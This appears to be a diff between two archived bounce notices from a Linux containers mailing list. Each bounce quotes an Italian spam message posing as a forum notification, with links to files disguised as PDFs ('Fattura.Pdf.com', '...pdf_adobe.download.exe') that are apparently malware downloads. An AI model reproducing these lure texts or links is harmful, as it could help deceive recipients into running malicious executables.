@@ -1,10 +1,9 @@
-From: MAILER-DAEMON-5FH3pS0S4hs8yWZI9xAYjNHuzzzSOjJt@public.gmane.org
-Subject: failure notice
-Date: 18 Oct 2012 03:31:33 +0200
-Message-ID: <20121018013817.5376A9F8@mail.linuxfoundation.org>
+From: MAILER-DAEMON-nH/gLuHjk3BCUW14vc7fK16hYfS7NtTn@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Thu, 18 Oct 2012 11:38:31 +0200 (CEST)
+Message-ID: <20121018093831.1D95A143FF@caacanapa.icoa.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============6290806481027888222=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,46 +17,106 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Hi. This is the qmail-send program at smart03.widhost.net.
-I'm afraid I wasn't able to deliver your message to the following addresses.
-This is a permanent error; I've given up. Sorry it didn't work out.
+This is a MIME-encapsulated message.
 
-<cafalini-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>:
-213.205.33.64 does not like recipient.
-Remote host said: 550 5.1.1 <cafalini-IWqWACnzNjyonA0d6jMUrA@public.gmane.org> recipient does not exist
-Giving up on 213.205.33.64.
+--===============6290806481027888222==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="14B1C143FD.1350553111/caacanapa.icoa.it"
+Content-Transfer-Encoding: 7bit
 
---- Below this line is a copy of the message.
+This is a MIME-encapsulated message.
+
+--14B1C143FD.1350553111/caacanapa.icoa.it
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
+
+This is the mail system at host caacanapa.icoa.it.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<indag19-HQ8bxwt+8YU@public.gmane.org>: Host or domain name not found. Name service error for
+    name=hcego.it type=A: Host not found
+
+--14B1C143FD.1350553111/caacanapa.icoa.it
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; caacanapa.icoa.it
+X-Postfix-Queue-ID: 14B1C143FD
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Thu, 18 Oct 2012 11:38:31 +0200 (CEST)
+
+Final-Recipient: rfc822; indag19-HQ8bxwt+8YU@public.gmane.org
+Original-Recipient: rfc822;indag19-HQ8bxwt+8YU@public.gmane.org
+Action: failed
+Status: 5.4.4
+Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error
+    for name=hcego.it type=A: Host not found
+
+--14B1C143FD.1350553111/caacanapa.icoa.it
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
 
 Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: (qmail 8821 invoked from network); 18 Oct 2012 03:31:17 +0200
-Received: from unknown (HELO xwash07.widhost.net) (192.168.133.30)
-  by 192.168.133.34 with SMTP; 18 Oct 2012 03:31:17 +0200
-Received: from cwin12.cassiopea.it (unknown [192.168.133.30])
-	by xwash07.widhost.net (Postfix) with ESMTP id 31CB01A197D
-	for <cafalini-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>; Thu, 18 Oct 2012 03:31:15 +0200 (CEST)
-Received: from localhost.localdomain ([69.64.42.16]) by cwin12.cassiopea.it with MailEnable ESMTP; Thu, 18 Oct 2012 03:31:10 +0200
-Received: from [69.64.42.16] by localhost.localdomain id VSKwV1hkui; Thu, 18 Oct 2012 03:31:12 +0200
-Message-ID: <008801cdacd0$3f5f5600$0500a8c0-bi+AKbBUZKY6gyzm1THtWbp2dZbC/Bob@public.gmane.org>
-From: "billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <cafalini-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>
-Subject: Re: Hai inviato una risposta al forum.
-Date: Thu, 18 Oct 2012 03:31:12 +0200
+Received: from localhost (localhost [127.0.0.1])
+	by caacanapa.icoa.it (Postfix) with ESMTP id 14B1C143FD
+	for <indag19-HQ8bxwt+8YU@public.gmane.org>; Thu, 18 Oct 2012 11:38:31 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at caacanapa.icoa.it
+Received: from caacanapa.icoa.it ([127.0.0.1])
+	by localhost (caacanapa.icoa.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id 2ttZiIn5pq6m for <indag19-HQ8bxwt+8YU@public.gmane.org>;
+	Thu, 18 Oct 2012 11:38:30 +0200 (CEST)
+Received: from wom.womenfreedating.com (184.172.230.17-static.reverse.softlayer.com [184.172.230.17])
+	(Authenticated sender: lerino-nH/gLuHjk3AL5bzFcGmneg@public.gmane.org)
+	by caacanapa.icoa.it (Postfix) with ESMTPA id 336EF143DF
+	for <indag19-HQ8bxwt+8YU@public.gmane.org>; Thu, 18 Oct 2012 11:38:30 +0200 (CEST)
+Received: from [184.172.230.17] by wom.womenfreedating.com id 2bnWGubc6I4e483X; Thu, 18 Oct 2012 07:38:29 -0200
+Message-ID: <007001cdad14$52941500$01000a0a-S764Ccl9onVUCObAhbPvufC9HSW9iNxf@public.gmane.org>
+From: "Giolla" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <indag19-HQ8bxwt+8YU@public.gmane.org>
+Subject: Risposta dal forum.
+Date: Thu, 18 Oct 2012 07:38:29 -0200
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-Content-Transfer-Encoding: 8bit
-X-ME-Bayesian: 40.000000
-X-xwash07-MailScanner-Information: Please contact the ISP for more information
-X-xwash07-MailScanner-ID: 31CB01A197D.ADE56
-X-xwash07-MailScanner: Found to be clean
-X-xwash07-MailScanner-SpamScore: sss
-X-xwash07-MailScanner-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-Spam-Status: No
+Content-Transfer-Encoding: quoted-printable
 
 
 
+Gentile utente, Monte Biz =20
 
-Hai inviato una risposta al forum.
-Siete interessati a statistiche sugli atti puo essere scaricato qui:
-http://ssklogatec.com/responderdownload/Fattura.Pdf.com?f4gYPIUTDMVrIR_userid=cafalini-IWqWACnzNjyonA0d6jMUrA@public.gmane.org
+
+E stata attivata i messaggi di servizio di notifica dal forum.
+Lei ha chiesto informazioni sul profilo.
+Le statistiche possono essere scaricati al seguente indirizzo:
+http://bkgjewelry.com/responderdownload/Statistica.Pdf_php_stat.pdf_adobe=
+.download.exe?account_id=3Dindag19-HQ8bxwt+8YU@public.gmane.org
+
+
+__
+uFAWP1eK3G
+
+
+
+--14B1C143FD.1350553111/caacanapa.icoa.it--
+
+--===============6290806481027888222==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============6290806481027888222==--
